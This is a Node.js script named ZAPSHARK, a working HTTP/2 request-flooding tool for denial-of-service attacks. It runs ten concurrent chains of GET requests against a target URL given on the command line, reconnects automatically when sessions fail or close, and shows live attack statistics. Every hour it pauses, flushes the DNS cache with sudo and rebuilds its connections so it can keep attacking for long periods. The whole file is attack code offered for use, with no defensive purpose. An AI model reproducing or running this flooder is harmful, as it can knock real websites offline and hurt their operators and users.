const http2 = require('http2');
const os = require('os');
const { exec } = require('child_process');

class ZAPSHARK {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.status = "ATTACKING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // Maintenance
        this.lastMaintenance = Date.now();
        this.maintenanceInterval = 3600000;
        this.maintenanceDuration = 600000;
        
        this.clients = [];
        this.maxClients = 5;
    }

    createClient() {
        try {
            const client = http2.connect(this.targetUrl);
            
            client.on('error', () => {
                // Silently recreate on error
                setTimeout(() => this.createClient(), 50);
            });
            
            client.on('goaway', () => {
                setTimeout(() => this.createClient(), 50);
            });
            
            this.clients.push(client);
            return client;
        } catch (err) {
            setTimeout(() => this.createClient(), 50);
        }
    }

    sendRequest() {
        if (this.clients.length === 0) {
            this.createClient();
            return;
        }

        const client = this.clients[Math.floor(Math.random() * this.clients.length)];
        if (!client || client.destroyed) {
            this.createClient();
            return;
        }

        try {
            const req = client.request({ 
                ':method': 'GET', 
                ':path': '/'
            });
            
            // CONFIRM SENT - then immediately send next
            req.on('ready', () => {
                this.totalRequests++;
                this.requestsSinceLastCalc++;
                this.sendRequest(); // IMMEDIATE NEXT REQUEST
            });
            
            req.on('error', () => {
                this.totalRequests++;
                this.requestsSinceLastCalc++;
                this.sendRequest(); // IMMEDIATE NEXT REQUEST
            });
            
            req.end();
            
        } catch (err) {
            this.totalRequests++;
            this.requestsSinceLastCalc++;
            this.sendRequest(); // IMMEDIATE NEXT REQUEST
        }
    }

    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    formatRuntime() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const minutes = Math.floor(runtime / 60) % 60;
        const seconds = runtime % 60;
        return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }

    updateDisplay() {
        this.calculateRPS();
        
        process.stdout.write('\x1B[2J\x1B[0f');
        console.log(`ZAP-SHARK: (${this.formatRuntime()}) | (${this.status})`);
        console.log('======================================');
        console.log(`T-ARP — ${this.totalRequests}`);
        console.log(`ARPS-S — ${this.currentRPS.toFixed(1)}`);
        console.log('======================================');
        console.log('©ZAP-SHARK — 2023 | V1');
    }

    flushDNS() {
        if (os.platform() === 'win32') {
            exec('ipconfig /flushdns', () => {});
        } else {
            exec('sudo dscacheutil -flushcache || sudo systemd-resolve --flush-caches', () => {});
        }
    }

    flushSockets() {
        this.clients.forEach(client => {
            try { client.destroy(); } catch (err) {}
        });
        this.clients = [];
        
        for (let i = 0; i < this.maxClients; i++) {
            setTimeout(() => this.createClient(), i * 50);
        }
    }

    checkMaintenance() {
        const currentTime = Date.now();
        const timeSinceLastMaintenance = currentTime - this.lastMaintenance;
        
        if (timeSinceLastMaintenance >= this.maintenanceInterval && this.status === "ATTACKING") {
            this.status = "PAUSED";
            this.flushDNS();
            this.flushSockets();
            
            setTimeout(() => {
                this.resumeAttack();
            }, this.maintenanceDuration);
            
            this.lastMaintenance = currentTime;
        }
    }

    resumeAttack() {
        this.status = "ATTACKING";
        this.lastMaintenance = Date.now();
        this.startAttack();
    }

    startAttack() {
        // START FLOOD - multiple concurrent attack chains
        const concurrentChains = 10;
        
        for (let i = 0; i < concurrentChains; i++) {
            setImmediate(() => {
                // Each chain immediately triggers next request on confirmation
                const attackChain = () => {
                    if (this.status === "ATTACKING") {
                        this.sendRequest();
                    } else {
                        setTimeout(attackChain, 100);
                    }
                };
                attackChain();
            });
        }
    }

    async start() {
        process.stdout.write('\x1B[2J\x1B[0f');
        process.stdout.write('\x1B[2J\x1B[0f');
        
        // Create clients
        for (let i = 0; i < this.maxClients; i++) {
            this.createClient();
        }
        
        // Start attack after brief setup
        setTimeout(() => {
            this.startAttack();
        }, 500);
        
        // Update display
        setInterval(() => {
            this.updateDisplay();
        }, 100);
        
        // Maintenance checker
        setInterval(() => {
            this.checkMaintenance();
        }, 1000);
        
        process.on('SIGINT', () => {
            this.stop();
        });
    }

    stop() {
        this.running = false;
        this.clients.forEach(client => {
            try { client.destroy(); } catch (err) {}
        });
        process.exit(0);
    }
}

// Usage
const target = process.argv[2] || 'https://example.com';
const shark = new ZAPSHARK(target);
shark.start();
